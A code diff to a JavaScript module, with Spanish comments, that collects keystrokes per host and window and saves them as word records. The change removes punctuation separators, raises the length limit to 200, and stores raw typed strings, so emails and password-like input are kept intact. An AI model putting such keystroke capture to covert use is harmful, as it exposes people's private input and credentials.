@@ -31,10 +31,7 @@ const MODIFIERS = new Set([
 ]);
 
 const MIN_LEN = 2;
-const MAX_LEN = 80;
-
-// Separadores de palabra. @ y . NO estan para capturar emails enteros.
-const SEPARATORS = /[,;:!?()\[\]{}"'`\/\\|<>#$%^&*=+~]/;
+const MAX_LEN = 200;
 
 // Patron basico de email.
 const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -121,7 +118,7 @@ function flush(host) {
   const complexity = classifyComplexity(raw);
 
   trackOp(
-    Word.create({ host, window: win, word, length: word.length, complexity, timestamp: startedAt })
+    Word.create({ host, window: win, word: raw, length: raw.length, complexity, timestamp: startedAt })
       .catch(err => console.error('Word.create:', err.message))
   );
 }
@@ -162,10 +159,6 @@ function handleKey({ host, window, key, timestamp }) {
 
   // Un unico caracter: lo acumulamos.
   if (key.length === 1) {
-    if (SEPARATORS.test(key)) {
-      flush(host);
-      return;
-    }
     if (b.text.length === 0) b.startedAt = timestamp ? new Date(timestamp) : new Date();
     b.text += key;
     if (b.text.length > MAX_LEN) {
